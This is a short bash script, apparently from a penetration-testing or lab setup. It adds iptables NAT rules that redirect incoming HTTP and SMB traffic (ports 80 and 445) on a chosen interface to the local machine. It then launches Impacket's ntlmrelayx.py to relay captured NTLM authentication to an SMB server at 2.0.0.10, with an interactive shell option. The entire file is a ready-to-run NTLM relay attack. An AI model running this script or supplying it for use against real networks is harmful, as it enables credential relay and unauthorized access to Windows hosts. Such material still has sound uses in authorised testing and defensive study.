#!/bin/bash

for port in 80 445
do
	if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q " $port"; then
	  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport $port -j REDIRECT --to-port $port
	fi
done

ntlmrelayx.py -t smb://2.0.0.10 -smb2support -i
